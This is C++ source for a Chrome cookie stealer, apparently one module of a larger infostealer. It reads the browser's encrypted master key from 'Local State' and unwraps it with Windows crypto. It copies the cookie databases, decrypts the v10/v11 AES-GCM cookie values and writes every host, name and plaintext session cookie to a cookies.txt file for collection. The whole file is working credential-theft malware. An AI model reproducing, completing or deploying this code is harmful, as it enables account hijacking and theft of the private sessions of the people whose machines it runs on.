#include "chrome_stealer.h"

#include <filesystem>
#include <fstream>
#include <shlobj_core.h>
#include <SQLiteCpp/SQLiteCpp.h>

#include "net.h"

#include "messages/text_message.h"
#include "messages/error_message.h"

net::expected<fs::path> get_browser_path()
{
    TCHAR appdata_path[MAX_PATH];

    if(!SUCCEEDED(SHGetFolderPath(nullptr,
                                 CSIDL_LOCAL_APPDATA,
                                 nullptr,
                                 0,
                                 appdata_path)))
    {
        return net::error_t("Chrome(ERROR): Cant get path SHGetFolderPath");
    }

    return fs::path(appdata_path) / "Google" / "Chrome" / "User Data";
}

net::expected<std::vector<BYTE>> get_encryption_key(const fs::path& browser_path)
{
    fs::path local_state_path = browser_path / "Local State";

    std::ifstream local_state_file{};
    local_state_file.open(local_state_path.string(), std::ios::binary | std::ios::in);
    if(!local_state_file.is_open())
    {
        return net::error_t("Chrome(ERROR): cant get local state for chrome");
    }

    std::string content{
        std::istreambuf_iterator<char>(local_state_file),
        std::istreambuf_iterator<char>()};

    auto jcontent = json::parse(content);
    std::string encryption_key64 = jcontent.at("os_crypt").at("encrypted_key").as_string().c_str();

    std::vector<BYTE> encryption_key;
    encryption_key.resize(beast::detail::base64::decoded_size(encryption_key64.size()), 0);
    beast::detail::base64::decode(
        (void*)encryption_key.data(),
        encryption_key64.data(),
        encryption_key64.size());

    std::vector<BYTE> to_ret;
    if(auto exp = net::win_crypt::encrypt(encryption_key.data() + 5, encryption_key.size() - 5))
        to_ret = exp.assume_value();
    else
        return net::error_t(std::format("Chrome(ERROR): {}", exp.assume_error().str()));

    return to_ret;
}

net::expected<std::vector<BYTE>> decrypt_data(const std::vector<BYTE>& buffer,
    const std::vector<BYTE>& encryption_key)
{
    std::vector<BYTE> decrypred_data;
    std::string encryption_key_string { encryption_key.begin(), encryption_key.end() };

    try
    {
        std::string_view buffer_string{ (const char*)buffer.data(), buffer.size() };
        if(buffer_string.starts_with("v10") || buffer_string.starts_with("v11"))
        {
            auto iv = buffer
                | rng::drop(3)  // v10
                | rng::take(12) // iv length
                | rng::as_t<std::vector<BYTE>>{};
            iv.push_back(0);

            auto cipher_text = buffer
                | rng::drop(15)                          // (v10) + (iv length)
                | rng::take( (buffer.size() - 15) - 16 ) // (current size) - tag size
                | rng::as_t<std::vector<BYTE>>{};
            cipher_text.push_back(0);

            auto tag = buffer
                | rng::drop(buffer.size() - 16) // buffer - tag length
                | rng::as_t<std::vector<BYTE>>{};
            tag.push_back(0);

            decrypred_data.resize(cipher_text.size(), 0);
            auto decrypred_data_len = net::aes_gsm::decrypt(
                cipher_text.data(), cipher_text.size() - 1/*Null Terminator*/,
                /*AAD: */ nullptr, 0,
                tag.data(), tag.size() - 1/*Null Terminator*/,
                (BYTE*)encryption_key_string.data(),
                iv.data(), iv.size() - 1/*Null Terminator*/,
                decrypred_data.data()
            );

            if(decrypred_data_len == -1)
                return net::error_t("Chrome(ERROR): cant decrypt, AES 256 GCM, v10 v11");

            decrypred_data.resize(decrypred_data_len);
        }
        else if(buffer_string.starts_with("v20"))
        {
            return net::error_t("Chrome(ERROR): cant decrypt v20");
        }
        else
        {
            if(auto exp = net::win_crypt::encrypt(buffer.data(), buffer.size()))
                decrypred_data = exp.assume_value();
            else
                return net::error_t(std::format("Chrome(ERROR): {}", exp.assume_error().str()));
        }
    } catch (std::exception& e)
    {
        return net::error_t("Chrome(ERROR): decryption of data failed");
    }

    return decrypred_data;
}

net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_path,
    const std::vector<BYTE>& encryption_key)
{
    std::vector<net::cookie_t> to_ret;

    const auto cookies_path = browser_path / "Default" / "Network";
    if(!fs::exists(cookies_path))
        return net::error_t("Chrome(ERROR): cookies folder not found");

    for (const auto& cookie_path : fs::recursive_directory_iterator(cookies_path))
    {
        if(!cookie_path.is_regular_file())
            continue;

        fs::path temp_cookie_file_path;
        do
        {
            temp_cookie_file_path = net::get_temp_unique_file_path();
        } while(fs::exists(temp_cookie_file_path));

        try
        {
            fs::copy_file(cookie_path, temp_cookie_file_path);
            FS_DEFER([&](...){
                fs::remove(temp_cookie_file_path);
            });

            SQLite::Database db(temp_cookie_file_path, SQLite::OPEN_READONLY);

            if(!db.tableExists("cookies"))
                continue;

            DLOG(std::format("Chrome(DISPLAY): file with cookie {}", cookie_path.path().string()));

            SQLite::Statement query{db, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies;"};

            while(query.executeStep())
            {
                const auto host = query.getColumn(0).getString();
                const auto name = query.getColumn(1).getString();
                const auto path = query.getColumn(2).getString();
                auto encrypted_cookie = (const BYTE*)query.getColumn(3).getBlob();
                auto encrypted_cookie_size = query.getColumn(3).getBytes();
                const auto expiry = query.getColumn(4).getUInt();

                std::vector<BYTE> cookie;
                if(encrypted_cookie_size != 0)
                {
                    std::vector<BYTE> encrypted_cookie_vec;
                    std::copy_n(encrypted_cookie, encrypted_cookie_size,
                        std::back_inserter(encrypted_cookie_vec));

                    if(auto exp = decrypt_data(encrypted_cookie_vec, encryption_key))
                        cookie = exp.assume_value();
                    else
                    {
                        DLOG(exp.assume_error().str());
                        continue;
                    }
                }

                to_ret.emplace_back(host,
                    name,
                    path,
                    std::string(cookie.begin(), cookie.end()),
                    expiry);
            }
        } catch (SQLite::Exception& ex)
        {
            if(ex.getErrorCode() != 26)
                DLOG(std::format("Chrome(ERROR): {} {}", ex.getErrorCode(), ex.what()));
            continue;
        } catch (...)
        {
            continue;
        }
    }

    return to_ret;
}

asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
{
        return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
        [this](auto completion_handler)
        {
            std::thread([this](auto completion_handler)
            {
                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto browser_path, get_browser_path());

                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto encryption_key, get_encryption_key(browser_path));
                DLOG("Chrome(DISPLAY): Encryption key received");

                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto cookies, get_cookies(browser_path, encryption_key));
                DLOG("Chrome(DISPLAY): Cookies received");

                std::ofstream cookies_file;
                cookies_file.open(save_path / "cookies.txt", std::ios::out);
                if(!cookies_file.is_open())
                {
                    std::move(completion_handler)
                        (std::make_unique<error_message_t>("Chrome(ERROR): Cant create cookie file"));
                    return;
                }
                for (const auto & cookie : cookies)
                {
                    cookies_file
                    << "=========================\n"
                    << cookie.to_string()
                    << "=========================\n";
                }
                cookies_file.close();

                DLOG("Chrome(DISPLAY): All saved");
                std::move(completion_handler)(std::make_unique<message_t>());
            }, std::move(completion_handler)).detach();
        }, asio::use_awaitable
    );
}

void chrome_stealer_t::set_save_folder(const fs::path& in_save_path, bool is_global)
{
    if(is_global)
        save_path = in_save_path / "Chrome";
    else
        save_path = in_save_path;

    fs::create_directories(save_path);
}
